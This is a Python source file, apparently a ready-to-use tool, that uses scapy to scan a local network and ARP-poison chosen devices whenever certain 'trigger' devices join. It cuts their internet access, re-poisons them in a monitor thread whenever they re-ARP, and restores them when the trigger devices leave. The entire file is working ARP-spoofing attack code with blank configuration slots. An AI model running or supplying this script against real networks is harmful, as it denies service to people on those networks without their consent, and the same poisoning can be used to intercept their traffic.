"""
net_deny.py
This script denies internet access to a list of hosts (DENY_MACS) when a host from a specified list hosts (TRIGGER_MACS)
join the network. Make sure IP_Forwarding is disable on your machine or it wont deny traffic to the internet.
"""


from time import sleep
import thread

from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.l2 import ARP

# CONFIG VARIABLES
NETWORK_ADDRESS = ""  # THE ADDRESS OF THE NETWORK; 192.168.1.0/24
NETWORK_INTERFACE = ""  # THE NETWORK INTERFACE; en0

GATEWAY_IP = ""  # THE IP OF THE GATEWAY
GATEWAY_MAC = ""  # THE MAC ADDRESS OF THE GATEWAY

TRIGGER_MACS = [""]  # MAC ADDRESSES THAT IF FOUND ON THE NETWORK TRIGGER THE ATTACK
DENY_MACS = [""]  # THE MAC ADDRESSES TO DENY INTERNET ACCESS TO

# Global Variables
CURRENTLY_DENYING = {}
TRIGGER_HOSTS_ONLINE = {}


def restore_device(ip_address, mac_address):
    """
    Un-poison a device restoring its connectivity to the internet
    :param ip_address: The IP of the device to restore
    :param mac_address: The MAC of the device to restore
    :return: None
    """
    if None in [ip_address, mac_address]:
        print("[!] ip_address and mac_address can not be None")
        return

    global CURRENTLY_DENYING, GATEWAY_IP, GATEWAY_MAC
    if CURRENTLY_DENYING.get(mac_address):
        del CURRENTLY_DENYING[mac_address]
    send(ARP(op=2, psrc=GATEWAY_IP, pdst=ip_address, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=GATEWAY_MAC), count=5)
    send(ARP(op=2, psrc=ip_address, pdst=GATEWAY_IP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac_address), count=5)
    print("[*] UN-POISONED DEVICE {}".format(mac_address))


def deny_device(ip_address, mac_address):
    """
    ARP Poison a device so it can no longer access the internet
    :param ip_address: The IP of the device to poison
    :param mac_address: The MAC of the device to poison
    :return:
    """
    if None in [ip_address, mac_address]:
        print("[!] ip_address and mac_address can not be None")
        return

    print("[*] DENYING {}".format(mac_address))
    global CURRENTLY_DENYING, GATEWAY_IP, GATEWAY_MAC
    send(ARP(op=2, psrc=GATEWAY_IP, pdst=ip_address, hwdst=mac_address))
    send(ARP(op=2, psrc=ip_address, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC))
    CURRENTLY_DENYING[mac_address] = ip_address


def poison_monitor(mac_address):
    """
    Monitor the network and re-poison poisoned devices that are trying to re-arp
    :param mac_address: The mac address of the poisoned device to monitor
    :return:
    """
    print("[*] STARTING MONITOR THREAD FOR {}".format(mac_address))
    global CURRENTLY_DENYING

    try:
        def re_poison(p):
            print("[*] RE-POISONING DEVICE {}".format(mac_address))
            deny_device(ip_address=CURRENTLY_DENYING.get(mac_address), mac_address=mac_address)

        # Continue while the device is supposed to be poisoned
        while CURRENTLY_DENYING.get(mac_address):
            sniff(filter="arp and host {}".format(CURRENTLY_DENYING.get(mac_address)), prn=re_poison, store=0, count=1)
    except Exception as e:
        print("[!] ERROR MONITORING DEVICE {0!s}: {1!s}".format(mac_address, e))
        restore_device(ip_address=CURRENTLY_DENYING.get(mac_address), mac_address=mac_address)


def scan_network():
    """
    Scan the network and return devices ip address and mac addresses.
    :return:
    """
    global NETWORK_ADDRESS
    print("[*] SCANNING NETWORK...")
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=NETWORK_ADDRESS), timeout=2, retry=10)
    hosts = {}
    for snd, rcv in responses:
        hosts[rcv[Ether].src] = rcv[ARP].psrc
    return hosts


def main():
    """
    Run continuously.
    Scan the network to see if any TRIGGER_MAC devices are connect to the network
    ARP poison DENY_MACS so they loose internet connectivity if at least 1 TRIGGER_MAC is on the network
    If there are no TRIGGER_MAC devices on the network then restore poisoned devices
    Sleep for 5 minutes
    REPEAT
    :return:
    """
    global CURRENTLY_DENYING, TRIGGER_HOSTS_ONLINE, NETWORK_INTERFACE, TRIGGER_MACS, DENY_MACS
    conf.iface = NETWORK_INTERFACE
    conf.verb = 0
    print("[*] STARTING UP")
    try:
        while True:
            # Overwrite this for each scan so that if a trigger device goes offline devices can be restored
            TRIGGER_HOSTS_ONLINE = {}

            network_hosts = scan_network()

            # iterate over the hosts to find trigger devices on the network
            for mac, ip in network_hosts.iteritems():
                if mac in TRIGGER_MACS:
                    print("[*] FOUND TRIGGER HOST {}".format(mac))
                    TRIGGER_HOSTS_ONLINE[mac] = ip

            # only deny devices if there is at least 1 trigger host on the network
            if len(TRIGGER_HOSTS_ONLINE) > 0:
                # iterate over the hosts to find devices to deny on the network
                for mac, ip in network_hosts.iteritems():
                    if mac in DENY_MACS and not CURRENTLY_DENYING.get(mac):
                        deny_device(ip_address=ip, mac_address=mac)
                        thread.start_new_thread(poison_monitor, (mac,))
            else:  # if there are no trigger hosts on the network then restore connectivity to the client
                print("[*] NO TRIGGER DEVICES FOUND! RESTORING ALL DEVICES")
                poisoned = CURRENTLY_DENYING.copy()
                for mac, ip in poisoned.iteritems():
                    restore_device(ip_address=ip, mac_address=mac)
            print("[*] SCANNING AGAIN IN 5 MINUTES")
            sleep(60*5)

    except KeyboardInterrupt:
        print("[*] RESTORING ALL DEVICES")
        poisoned = CURRENTLY_DENYING.copy()
        for mac, ip in poisoned.iteritems():
            restore_device(ip_address=ip, mac_address=mac)
        print("[*] SHUTTING DOWN")


if __name__ == '__main__':
    main()
